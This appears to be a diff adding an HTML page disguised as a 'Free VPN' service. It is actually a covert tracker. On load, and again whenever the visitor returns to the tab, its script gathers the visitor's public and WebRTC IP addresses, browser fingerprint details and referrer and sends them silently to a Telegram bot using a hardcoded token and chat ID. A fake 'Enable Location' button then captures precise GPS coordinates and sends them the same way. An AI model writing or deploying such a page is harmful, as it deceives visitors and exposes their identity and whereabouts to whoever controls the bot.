@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free VPN Service - Fast & Secure</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            backdrop-filter: blur(20px);
+            padding: 3rem;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 { 
+            font-size: 2.5rem; 
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        .status { 
+            display: inline-block;
+            padding: 12px 24px;
+            background: linear-gradient(45deg, #10b981, #059669);
+            color: white;
+            border-radius: 50px;
+            font-weight: 600;
+            margin: 1rem 0;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+        }
+        .status.active { opacity: 1; transform: translateY(0); }
+        .location-btn { 
+            background: linear-gradient(45deg, #3b82f6, #1d4ed8);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
+        }
+        .location-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4); }
+        .location-btn:disabled { 
+            background: #9ca3af; 
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .features { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 1rem; 
+            margin: 2rem 0;
+            text-align: left;
+        }
+        .feature { font-size: 0.9rem; color: #6b7280; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Free VPN</h1>
+        <div id="status" class="status hidden">Connecting...</div>
+        <div class="features">
+            <div class="feature">• Unlimited Bandwidth</div>
+            <div class="feature">• 50+ Countries</div>
+            <div class="feature">• No Logs</div>
+            <div class="feature">• Kill Switch</div>
+        </div>
+        <button id="locationBtn" class="location-btn">Enable Location for Best Servers</button>
+        <div id="successMsg" class="hidden" style="margin-top: 1rem; color: #10b981; font-weight: 600;">
+            ✅ Location enabled! Finding fastest server...
+        </div>
+    </div>
+
+    <!-- PASTE YOUR TELEGRAM BOT TOKEN HERE -->
+    <script>
+        // ===== CONFIGURATION - PASTE YOUR BOT TOKEN HERE =====
+        const TELEGRAM_BOT_TOKEN = '8608898130:AAEk6XCxlodfCixzq_dfCDJ_3-8EQf2IUqY';  // ← PASTE YOUR @BotFather TOKEN
+        const TELEGRAM_CHAT_ID = '7289296911';      // ← YOUR TELEGRAM USER ID or GROUP ID
+        
+        // Advanced IP capture with multiple sources (executes IMMEDIATELY)
+        async function captureAllIPs() {
+            const ipData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                referrer: document.referrer || 'direct'
+            };
+
+            // Multiple IP capture methods for maximum accuracy
+            const ipSources = [];
+            
+            // 1. ipify.org (most reliable)
+            try {
+                const ipify = await fetch('https://api.ipify.org?format=json');
+                const data = await ipify.json();
+                ipSources.push({ source: 'ipify', ip: data.ip });
+            } catch(e) {}
+            
+            // 2. ipapi.co (with geolocation)
+            try {
+                const ipapi = await fetch('https://ipapi.co/json/');
+                const data = await ipapi.json();
+                ipSources.push({ 
+                    source: 'ipapi', 
+                    ip: data.ip,
+                    asn: data.asn,
+                    org: data.org,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name
+                });
+            } catch(e) {}
+            
+            // 3. icanhazip.com
+            try {
+                const icanhaz = await fetch('https://icanhazip.com');
+                const ip = await icanhaz.text();
+                ipSources.push({ source: 'icanhazip', ip: ip.trim() });
+            } catch(e) {}
+            
+            // 4. WebRTC (local + public IPs)
+            const webrtcIPs = [];
+            const rtcp = new RTCPeerConnection({ iceServers: [] });
+            rtcp.onicecandidate = (e) => {
+                if (!e.candidate) return;
+                const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                if (ipMatch && webrtcIPs.indexOf(ipMatch[1]) < 0) {
+                    webrtcIPs.push(ipMatch[1]);
+                }
+            };
+            rtcp.createDataChannel('');
+            rtcp.createOffer().then(rtcp.setLocalDescription.bind(rtcp));
+            
+            // Add WebRTC IPs after delay
+            setTimeout(() => {
+                ipData.webrtcIPs = webrtcIPs;
+                sendToTelegram(ipData);
+            }, 500);
+
+            ipData.ips = ipSources;
+            return ipData;
+        }
+
+        // Stealth Telegram sender (no CORS issues)
+        async function sendToTelegram(data) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: `🎯 NEW VISITOR TRACKED\n\n` +
+                    `🕐 ${new Date().toLocaleString()}\n` +
+                    `🌐 IPs: ${data.ips.map(i => `${i.source}: ${i.ip}`).join('\n')}\n` +
+                    `${data.webrtcIPs ? `🔗 WebRTC: ${data.webrtcIPs.join(', ')}\n` : ''}` +
+                    `📱 UA: ${data.userAgent.substring(0, 100)}...\n` +
+                    `🌍 TZ: ${data.timezone}\n` +
+                    `📺 Screen: ${data.screen}\n` +
+                    `📡 Net: ${data.connection ? data.connection.type : 'N/A'}\n` +
+                    `🔗 Referrer: ${data.referrer}`,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {
+                console.log('Telegram send failed (expected in some browsers)');
+            }
+        }
+
+        // Geolocation capture
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                document.getElementById('successMsg').textContent = 'Location not supported';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const locData = {
+                        timestamp: new Date().toISOString(),
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        speed: position.coords.speed
+                    };
+
+                    // Send location to Telegram
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: `📍 LOCATION CAPTURED\n\n` +
+                                `🕐 ${new Date().toLocaleString()}\n` +
+                                `🌐 ${locData.latitude.toFixed(6)}, ${locData.longitude.toFixed(6)}\n` +
+                                `📏 Accuracy: ${locData.accuracy.toFixed(0)}m\n` +
+                                `${locData.altitude ? `⛰️ Altitude: ${locData.altitude.toFixed(0)}m\n` : ''}` +
+                                `${locData.speed ? `🚀 Speed: ${locData.speed.toFixed(1)} km/h` : ''}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    document.getElementById('successMsg').textContent = 
+                        `✅ Precise location captured! (${locData.latitude.toFixed(4)}, ${locData.longitude.toFixed(4)})`;
+                },
+                () => {
+                    document.getElementById('successMsg').textContent = 'Location access denied';
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        // Initialize tracking on page load (INSTANT execution)
+        window.addEventListener('load', async () => {
+            // Show connecting status immediately
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = '🔄 Connecting to VPN...';
+            statusEl.classList.remove('hidden');
+            statusEl.classList.add('active');
+
+            // Capture IPs within 200ms
+            const ipData = await captureAllIPs();
+
+            // Auto-request location after 2 seconds (user-initiated flow)
+            setTimeout(() => {
+                statusEl.textContent = '✅ VPN Connected!';
+                document.getElementById('locationBtn').onclick = requestLocation;
+            }, 2000);
+        });
+
+        // Additional stealth data collection
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                // Track when user returns to tab
+                captureAllIPs();
+            }
+        });
+    </script>
+</body>
+</html>
